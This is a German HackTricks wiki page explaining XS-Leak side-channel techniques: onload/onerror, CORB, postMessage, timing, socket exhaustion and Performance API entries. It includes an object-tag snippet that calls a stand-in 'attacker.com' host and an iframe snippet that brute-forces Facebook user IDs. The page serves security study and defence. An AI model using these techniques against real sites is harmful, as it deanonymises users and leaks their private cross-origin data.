# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

XS-Search ist eine Methode, die verwendet wird, um cross-origin Informationen zu extrahieren, indem Side-Channel-Schwachstellen ausgenutzt werden.

Wesentliche Komponenten dieses Angriffs sind:

- **Vulnerable Web**: Die Ziel-Website, von der Informationen extrahiert werden sollen.
- **Attacker's Web**: Die bösartige Website, die vom Angreifer erstellt wird und die das Exploit hostet, die das Opfer besucht.
- **Inclusion Method**: Die Technik, mit der das Vulnerable Web in das Attacker's Web eingebunden wird (z. B. `window.open`, iframe, fetch, HTML-Tag mit href, etc.).
- **Leak Technique**: Techniken, die verwendet werden, um anhand der Inclusion Method Unterschiede im Zustand des Vulnerable Webs zu erkennen.
- **States**: Die zwei möglichen Zustände des Vulnerable Webs, die der Angreifer unterscheiden möchte.
- **Detectable Differences**: Beobachtbare Variationen, auf die sich der Angreifer stützt, um den Zustand des Vulnerable Webs abzuleiten.

### Erkennbare Unterschiede

Mehrere Aspekte können analysiert werden, um die Zustände des Vulnerable Web zu unterscheiden:

- **Status Code**: Unterschied zwischen verschiedenen HTTP-Antwort-Statuscodes cross-origin, wie Serverfehler, Clientfehler oder Authentifizierungsfehler.
- **API Usage**: Erkennen der Nutzung von Web APIs über Seiten hinweg, wodurch sichtbar wird, ob eine cross-origin Seite eine bestimmte JavaScript Web API verwendet.
- **Redirects**: Erkennen von Navigationen zu anderen Seiten — nicht nur HTTP-Redirects, sondern auch solche, die durch JavaScript oder HTML ausgelöst werden.
- **Page Content**: Beobachtung von Unterschieden im HTTP-Antwort-Body oder in Seiten-Sub-Ressourcen, wie z. B. die Anzahl eingebetteter Frames oder Größenunterschiede bei Bildern.
- **HTTP Header**: Feststellen der Präsenz oder möglicherweise des Werts eines spezifischen HTTP-Antwort-Headers, einschließlich Headern wie X-Frame-Options, Content-Disposition und Cross-Origin-Resource-Policy.
- **Timing**: Wahrnehmen konsistenter Zeitunterschiede zwischen den beiden Zuständen.

### Inklusionsmethoden

- **HTML Elements**: HTML bietet verschiedene Elemente zur cross-origin Ressourceneinbindung, wie stylesheets, images oder scripts, die den Browser zwingen, eine Non-HTML-Ressource anzufordern. Eine Zusammenstellung möglicher HTML-Elemente für diesen Zweck findet sich unter [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: Elemente wie **iframe**, **object** und **embed** können HTML-Ressourcen direkt in die Seite des Angreifers einbetten. Wenn die Seite **keinen Framing-Schutz** hat, kann JavaScript über die contentWindow-Eigenschaft auf das Window-Objekt der eingebetteten Ressource zugreifen.
- **Pop-ups**: Die Methode `window.open` öffnet eine Ressource in einem neuen Tab oder Fenster und stellt einen Window-Handle zur Verfügung, mit dem JavaScript gemäß SOP mit Methoden und Eigenschaften interagieren kann. Pop-ups, häufig bei Single-Sign-On verwendet, umgehen Framing- und Cookie-Einschränkungen einer Zielressource. Moderne Browser beschränken jedoch die Erzeugung von Pop-ups auf bestimmte Benutzeraktionen.
- **JavaScript Requests**: JavaScript ermöglicht direkte Anfragen an Zielressourcen mittels **XMLHttpRequests** oder der **Fetch API**. Diese Methoden bieten präzise Kontrolle über die Anfrage, z. B. die Option, HTTP-Redirects zu folgen.

### Leak-Techniken

- **Event Handler**: Eine klassische Leak-Technik in XS-Leaks, bei der Event-Handler wie **onload** und **onerror** Hinweise über den Erfolg oder Misserfolg des Ladens einer Ressource liefern.
- **Error Messages**: JavaScript-Ausnahmen oder spezielle Fehlerseiten können Leak-Informationen liefern, entweder direkt durch die Fehlermeldung oder durch das Differenzieren zwischen deren Vorhandensein und Abwesenheit.
- **Global Limits**: Physische Beschränkungen eines Browsers, wie Speichergrenzen oder andere erzwungene Browser-Limits, können anzeigen, wenn eine Schwelle erreicht ist, und als Leak-Technik dienen.
- **Global State**: Erkennbare Interaktionen mit Browser-Globalzuständen (z. B. dem History-Interface) können ausgenutzt werden. Beispielsweise kann die **Anzahl der Einträge** im Browser-Verlauf Hinweise über cross-origin Seiten geben.
- **Performance API**: Diese API liefert Leistungsdaten der aktuellen Seite, einschließlich Netzwerktimings für das Dokument und geladene Ressourcen, was Rückschlüsse auf angeforderte Ressourcen ermöglicht.
- **Readable Attributes**: Einige HTML-Attribute sind cross-origin lesbar und können als Leak-Technik verwendet werden. Zum Beispiel erlaubt die Eigenschaft `window.frame.length` JavaScript, die Anzahl der in einer Webseite enthaltenen Frames cross-origin zu zählen.

## XSinator Tool & Paper

XSinator ist ein automatisiertes Tool, um Browser gegen mehrere bekannte XS-Leaks zu testen, die in seinem Paper erklärt werden: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Sie können **auf das Tool zugreifen unter** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Excluded XS-Leaks**: Wir mussten XS-Leaks ausschließen, die auf **service workers** beruhen, da diese anderen leaks in XSinator in die Quere kommen würden. Außerdem haben wir uns entschieden, **XS-Leaks auszuschließen, die auf Fehlkonfigurationen und Bugs in einer spezifischen Webanwendung beruhen**. Zum Beispiel CrossOrigin Resource Sharing (CORS) Fehlkonfigurationen, postMessage leakage oder Cross-Site Scripting. Zusätzlich haben wir zeitbasierte XS-Leaks ausgeschlossen, da diese oft langsam, laut und ungenau sind.

## **Timing-basierte Techniken**

Einige der folgenden Techniken verwenden Timing als Teil des Prozesses, um Unterschiede in den möglichen Zuständen der Webseiten zu erkennen. Es gibt verschiedene Möglichkeiten, Zeit in einem Webbrowser zu messen.

**Clocks**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API erlaubt Entwicklern hochauflösende Zeitmessungen.\
Es gibt eine beträchtliche Anzahl von APIs, die Angreifer missbrauchen können, um implizite Uhren zu erzeugen: Broadcast Channel API, Message Channel API, requestAnimationFrame, setTimeout, CSS-Animationen und andere.\
Für mehr Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event-Handler-Techniken

### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **Mehr Info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Zusammenfassung**: Wenn versucht wird, eine Ressource zu laden, werden onerror/onload-Events ausgelöst; je nachdem, ob die Ressource erfolgreich/erfolglos geladen wurde, ist es möglich, den Statuscode herauszufinden.
- **Codebeispiel**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)


{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Das Codebeispiel versucht, scripts objects aus JS zu laden, aber andere tags wie objects, stylesheets, images, audios könnten ebenfalls verwendet werden. Außerdem ist es möglich, das Tag direkt zu injizieren und die `onload`- und `onerror`-Events direkt im Tag zu deklarieren (anstatt sie aus JS zu setzen).

Es gibt auch eine skriptlose Version dieses Angriffs:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In diesem Fall, wenn `example.com/404` nicht gefunden wird, wird `attacker.com/?error` geladen.

### Content-Type/CORB script load oracle

- **Inclusion Methods**: HTML-Elemente (script)
- **Detectable Difference**: Header / Content-Type über onload vs onerror (CORB)
- **Summary:** Wenn ein Endpoint bei Treffer HTML und bei Nicht-Treffer JSON zurückgibt, lade ihn mit `<script src>`. HTML löst `onload` aus; JSON wird von CORB geblockt und löst `onerror` aus, was ein Boolean-Oracle liefert, um Identifiers wie `__user` innerhalb eines bekannten Bereichs zu brute-forcen.
- **Notes:** Funktioniert cross-origin ohne Bodies zu lesen; praktisch, um das aktive Konto zu enumerieren, wenn eine tenant ID fest ist.

### postMessage vs X-Frame-Options deny oracle

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header (XFO) + postMessage Vorhandensein/Fehlen
- **Summary:** Manche Widgets senden ein postMessage an ihren Parent, sobald sie geladen sind. Wenn die Anfrage mit einer falschen Kennung gerahmt wird, kann der Server mit `X-Frame-Options: deny` antworten, wodurch das Rendering verhindert wird und daher keine Nachricht gesendet wird. Indem man das iframe `src` mit der Kandidaten-ID setzt, auf ein `message`-Event wartet (Erfolg) und Timeout/keine Nachricht als Fehlschlag behandelt, kann das aktive Konto brute-forced werden.
- **Minimal snippet:**
```html
<iframe id=fb width=0 height=0></iframe>
<script>
function test(id){
fb.src=`https://www.facebook.com/plugins/like.php?__a=1&__user=${id}`;
return new Promise(r=>{
const t=setTimeout(()=>r(false),2000);
onmessage=()=>{clearTimeout(t);r(true);}
});
}
</script>
```
- **Verwandt:**
{{#ref}}
../postmessage-vulnerabilities/README.md
{{#endref}}

{{#ref}}
../iframe-traps.md
{{#endref}}

für weitere message/iframe-Fallen.

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kann verwendet werden, um zu messen, wie viel Zeit eine Anfrage benötigt. Es können jedoch auch andere Zeitgeber verwendet werden, wie z. B. die [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), die Tasks identifizieren kann, die länger als 50 ms laufen.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ein weiteres Beispiel in:


{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

This technique is just like the previous one, but the **attacker** will also **force** some action to take a **relevant amount time** when the **answer is positive or negative** and measure that time.


{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kann verwendet werden, um zu messen, wie viel Zeit eine Anfrage benötigt. Andere Zeitgeber könnten verwendet werden.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die zum Abrufen einer Ressource benötigte Zeit kann gemessen werden, indem die Ereignisse `unload` und `beforeunload` genutzt werden. Das **`beforeunload`**-Ereignis wird ausgelöst, wenn der Browser kurz davor ist, zu einer neuen Seite zu navigieren, während das **`unload`**-Ereignis auftritt, wenn die Navigation tatsächlich stattfindet. Die Zeitdifferenz zwischen diesen beiden Ereignissen kann berechnet werden, um die **Dauer zu bestimmen, die der Browser mit dem Abrufen der Ressource verbracht hat**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kann verwendet werden, um zu messen, wie viel Zeit eine Anfrage benötigt. Andere Zeitgeber könnten verwendet werden.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Es wurde beobachtet, dass in Abwesenheit von [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) die Zeit, die eine Seite und ihre Subresources zum Laden über das Netzwerk benötigen, von einem Angreifer gemessen werden kann. Diese Messung ist typischerweise möglich, weil der onload-Handler eines iframe erst nach Abschluss des Ladens der Ressourcen und der Ausführung von JavaScript ausgelöst wird. Um die durch Skriptausführung eingeführte Variabilität zu umgehen, könnte ein Angreifer das `sandbox`-Attribut innerhalb des <iframe> einsetzen. Die Einbindung dieses Attributs schränkt zahlreiche Funktionalitäten ein, insbesondere die Ausführung von JavaScript, und ermöglicht so eine Messung, die vorwiegend von der Netzwerkperformance beeinflusst wird.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary**: Wenn du die Seite so zum Fehler bringen kannst, dass sie beim Zugriff auf den korrekten Inhalt einen Fehler liefert, und beim Zugriff auf beliebigen (inkorrekten) Inhalt korrekt lädt, kannst du eine Schleife bauen, um alle Informationen zu extrahieren, ohne die Zeit messen zu müssen.
- **Code Example**:

Angenommen, du kannst die Seite mit dem geheimen Inhalt innerhalb eines Iframe einfügen.

Du kannst das Opfer dazu bringen, nach der Datei zu suchen, die "_**flag**_" enthält, indem du ein Iframe nutzt (zum Beispiel über CSRF). Innerhalb des Iframe weißt du, dass das _**onload event**_ mindestens einmal ausgeführt wird. Dann kannst du die URL des iframe ändern, indem du nur den Hash-Teil der URL änderst.

Beispiel:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Wenn die erste URL **erfolgreich geladen** wurde, wird beim Ändern des Hash-Teils der URL das **onload**-Event **nicht erneut ausgelöst**. Aber **wenn** die Seite beim Laden einen **Fehler** hatte, wird das **onload**-Event **wieder ausgelöst**.

So kannst du zwischen einer korrekt geladenen Seite und einer Seite unterscheiden, die beim Zugriff einen Fehler hat.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary:** Wenn die **Seite** den **sensitiven** Inhalt zurückgibt oder Inhalt, der vom Benutzer kontrolliert werden kann. Der Benutzer könnte im negativen Fall gültigen JS-Code setzen und bei jedem Versuch ein `<script>` laden; in negativen Fällen wird der Angreifer-Code ausgeführt, in positiven Fällen passiert nichts.
- **Code Example:**


{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code & Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** ist eine Sicherheitsmaßnahme, die verhindert, dass Webseiten bestimmte sensitive cross-origin Ressourcen laden, um gegen Angriffe wie **Spectre** zu schützen. Angreifer können jedoch das schützende Verhalten ausnutzen. Wenn eine Antwort, die CORB unterliegt, einen _**CORB protected**_ `Content-Type` mit `nosniff` und einem `2xx`-Statuscode zurückgibt, entfernt **CORB** den Response-Body und die Header. Angreifer, die dies beobachten, können die Kombination aus **Statuscode** (erfolgreich oder Fehler) und `Content-Type` (ob durch **CORB** geschützt) ableiten, was zu potenziellen Informationsleaks führt.
- **Code Example:**

Siehe den More info Link für weitere Details zum Angriff.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Leak von sensitiven Daten aus dem id- oder name-Attribut.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es ist möglich, eine Seite innerhalb eines iframe zu laden und den `#id_value` zu nutzen, um das iframe-Element mit der angegebenen id zu fokussieren; wenn dann ein `onblur`-Signal ausgelöst wird, existiert das ID-Element.\
Den gleichen Angriff kann man mit `portal`-Tags durchführen.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Sammle sensitive Informationen aus postMessage oder verwende das Vorhandensein von postMessages als Oracle, um den Status des Benutzers auf der Seite zu erfahren.
- **Code Example**: `Any code listening for all postMessages.`

Anwendungen nutzen häufig [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), um über verschiedene Origins hinweg zu kommunizieren. Wenn das `targetOrigin` jedoch nicht korrekt gesetzt ist, können unbeabsichtigt alle Fenster die Nachrichten empfangen, wodurch **sensitive information** offengelegt werden kann. Außerdem kann allein das Empfangen einer Nachricht als **Oracle** dienen; bestimmte Messages werden beispielsweise nur an eingeloggte User gesendet. Das Vorhandensein oder Fehlen dieser Messages kann somit Informationen über den Zustand oder die Identität des Benutzers liefern, z. B. ob er authentifiziert ist.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Das Erschöpfen des WebSocket-Verbindungs-Limits leakt die Anzahl der WebSocket-Verbindungen einer cross-origin Seite.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Es ist möglich zu ermitteln, ob und wie viele **WebSocket-Verbindungen eine Zielseite nutzt**. Das erlaubt einem Angreifer, Anwendungszustände zu erkennen und Informationen zu leaken, die mit der Anzahl der WebSocket-Verbindungen zusammenhängen.

Wenn eine **Origin** die maximale Anzahl an WebSocket-Connection-Objekten nutzt, führt das Erstellen neuer Objekte zu JavaScript-Ausnahmen. Für den Angriff öffnet die Angreifer-Website die Zielwebsite in einem Pop-up oder iframe und versucht nach dem Laden der Zielseite, die maximale Anzahl an WebSockets zu erstellen. Die **Anzahl der geworfenen Exceptions** entspricht der **Anzahl der vom Zielfenster genutzten WebSocket-Verbindungen**.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Erkennen einer Payment Request, weil nur eine gleichzeitig aktiv sein kann.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Dieses XS-Leak ermöglicht einem Angreifer zu **erkennen, wann eine cross-origin Seite eine Payment Request** initiiert.

Da **nur eine Payment Request zur gleichen Zeit aktiv sein kann**, schlagen weitere Versuche, dieselbe API aufzurufen, fehl und verursachen eine JavaScript-Exception. Der Angreifer kann periodisch versuchen, die Payment API UI anzuzeigen; führt ein Versuch zu einer Exception, benutzt die Zielseite die API gerade. Der Angreifer kann diese periodischen Versuche verschleiern, indem er die UI direkt nach dem Erstellen wieder schließt.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generell bedingt durch Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Miss die Ausführungszeit von Code auf einer Website, indem du das single-threaded JS event loop ausnutzt.
- **Code Example**:


{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript arbeitet mit dem [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)-Concurrency-Modell, was bedeutet, dass **jeweils nur eine Aufgabe ausgeführt werden kann**. Diese Eigenschaft kann ausgenutzt werden, um zu messen, **wie lange Code einer anderen Origin zur Ausführung braucht**. Ein Angreifer kann die Ausführungszeit seines eigenen Codes im Event Loop messen, indem er kontinuierlich Events mit festen Eigenschaften dispatcht. Diese Events werden verarbeitet, wenn der Event-Pool leer ist. Wenn andere Origins ebenfalls Events in denselben Pool schicken, kann ein **Angreifer durch Beobachtung von Verzögerungen bei der Ausführung seiner eigenen Tasks** die Ausführungszeit dieser externen Events ableiten. Diese Methode, den Event Loop auf Verzögerungen zu überwachen, kann die Ausführungszeit von Code anderer Origins offenlegen und dadurch sensitive Informationen preisgeben.

> [!WARNING]
> Bei einem execution timing ist es möglich, **Netzwerkfaktoren zu eliminieren**, um **präzisere Messungen** zu erhalten. Zum Beispiel, indem man die Ressourcen, die die Seite nutzt, vorlädt.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generell bedingt durch Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Eine Methode zur Messung der Ausführungszeit einer Web-Operation ist, den Event Loop eines Threads bewusst zu blockieren und dann zu messen, **wie lange es dauert, bis der Event Loop wieder verfügbar ist**. Durch Einfügen einer blockierenden Operation (z. B. einer langen Berechnung oder eines synchronen API-Aufrufs) in den Event Loop und Überwachen der Zeit bis zur Ausführung nachfolgender Codes, lässt sich die Dauer der Tasks ableiten, die während des Blockierzeitraums im Event Loop liefen. Diese Technik nutzt die single-threaded Natur von JavaScript und kann Einblicke in das Verhalten anderer Operationen geben, die denselben Thread teilen.
- **Code Example**:

Ein wesentlicher Vorteil der Technik, die Ausführungszeit durch Sperren des Event Loops zu messen, ist die Möglichkeit, **Site Isolation** zu umgehen. **Site Isolation** trennt verschiedene Webseiten in separaten Prozessen, um direkten Zugriff auf sensible Daten zu verhindern. Indem ein Angreifer jedoch die Ausführungszeit einer anderen Origin über den gemeinsamen Event Loop beeinflusst, kann er indirekt Informationen über die Aktivitäten dieser Origin extrahieren. Diese Methode verlässt sich nicht auf direkten Zugriff auf fremde Daten, sondern beobachtet die Auswirkungen der fremden Aktivitäten auf den geteilten Event Loop und umgeht so die Schutzbarrieren von **Site Isolation**.

> [!WARNING]
> Bei einem execution timing ist es möglich, **Netzwerkfaktoren zu eliminieren**, um **präzisere Messungen** zu erhalten. Zum Beispiel, indem man die Ressourcen, die die Seite nutzt, vorlädt.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generell bedingt durch Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Ein Angreifer könnte alle Sockets bis auf einen belegen, die Zielseite laden und gleichzeitig eine andere Seite laden; die Zeit bis die letzte Seite zu laden beginnt, entspricht der Ladezeit der Zielseite.
- **Code Example**:


{{#ref}}
connection-pool-example.md
{{#endref}}

Browser nutzen Sockets zur Serverkommunikation, haben aber aufgrund begrenzter Betriebssystem- und Hardware-Ressourcen **eine Grenze** für die Anzahl gleichzeitiger Sockets. Angreifer können diese Grenze folgendermaßen ausnutzen:

1. Ermittle das Socket-Limit des Browsers, z. B. 256 globale Sockets.
2. Belege 255 Sockets über längere Zeit, indem du 255 Requests an verschiedene Hosts startest, die die Verbindungen offen halten.
3. Verwende den 256. Socket, um eine Anfrage an die Zielseite zu senden.
4. Versuche eine 257. Anfrage an einen anderen Host. Da alle Sockets benutzt werden (Schritte 2 und 3), wird diese Anfrage in die Warteschlange gestellt, bis ein Socket frei wird. Die Verzögerung bis zur Verarbeitung gibt Timing-Informationen über die Netzwerkaktivität des 256. Sockets (die Zielseite). Das ist möglich, weil die 255 Sockets aus Schritt 2 noch belegt sind; der freie Socket muss daher der von Schritt 3 sein. Die Zeit bis zur Freigabe des 256. Sockets hängt direkt mit der Zeit zusammen, die die Anfrage an die Zielseite benötigt.

Für mehr Infos: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generell bedingt durch Page Content, Status Code)
- **More info**:
- **Summary:** Wie die vorherige Technik, aber Chrome setzt ein Limit von **6 gleichzeitigen Requests an dieselbe Origin**. Wenn wir **5 blockieren** und dann eine **6. Anfrage** starten, können wir sie zeitlich messen; wenn die Zielseite mehr Requests an denselben Endpunkt sendet, wird die **6. Anfrage** länger dauern und das ist detektierbar.

## Performance API Techniques

Die [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) liefert Einblicke in Performance-Metriken von Web-Apps, ergänzt durch die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Die Resource Timing API ermöglicht das Monitoring detaillierter Netzwerk-Timings, z. B. Dauer von Requests. Wenn Server den Header `Timing-Allow-Origin: *` setzen, werden zusätzliche Daten wie Transfergröße und Domain-Lookup-Zeit verfügbar.

Diese Daten können über Methoden wie [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) oder [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) abgerufen werden. Man kann Ausführungszeiten auch mit Zeitstempeldifferenzen von [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) messen. Beachte jedoch, dass in manchen Browsern wie Chrome die Präzision von `performance.now()` auf Millisekunden begrenzt sein kann, was die Granularität der Messungen beeinflusst.

Neben Timing-Messungen kann die Performance API für sicherheitsrelevante Erkenntnisse genutzt werden. Zum Beispiel kann das Vorhandensein oder Fehlen von Seiten im `performance`-Objekt in Chrome auf die Anwendung von `X-Frame-Options` hinweisen. Wenn eine Seite aufgrund von `X-Frame-Options` am Anzeigen in einem frame gehindert wird, wird sie nicht im `performance`-Objekt aufgezeichnet, was einen Hinweis auf die Framing-Policy liefert.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Ein Request, der einen Fehler erzeugt, erzeugt keinen resource timing Eintrag.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es ist möglich, **zwischen HTTP-Response-Statuscodes zu unterscheiden**, denn Requests, die zu einem **Fehler** führen, erzeugen keinen Performance-Eintrag.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Wegen eines Browser-Bugs werden fehlgeschlagene Requests zweimal geladen.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In der vorherigen Technik wurden zwei Fälle identifiziert, in denen Browser-Bugs in GC dazu führen, dass **Ressourcen beim Fehlschlag zweimal geladen** werden. Dies führt zu mehrfachen Einträgen in der Performance API und ist somit detektierbar.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Requests, die zu einem Fehler führen, können nicht gemerged werden.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die Technik wurde in einer Tabelle in der genannten Arbeit gefunden, aber dort nicht weiter beschrieben. Den Quellcode zur Prüfung findest du unter [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Leere Responses erzeugen keine resource timing Einträge.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ein Angreifer kann erkennen, ob eine Anfrage einen leeren HTTP-Response-Body ergab, weil **leere Seiten in einigen Browsern keinen Performance-Eintrag erzeugen**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Durch den XSS Auditor in Security Assertions können Angreifer bestimmte Elemente einer Webseite erkennen, indem sie Änderungen in Antworten beobachten, wenn speziell konstruierte Payloads den Auditor auslösen.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

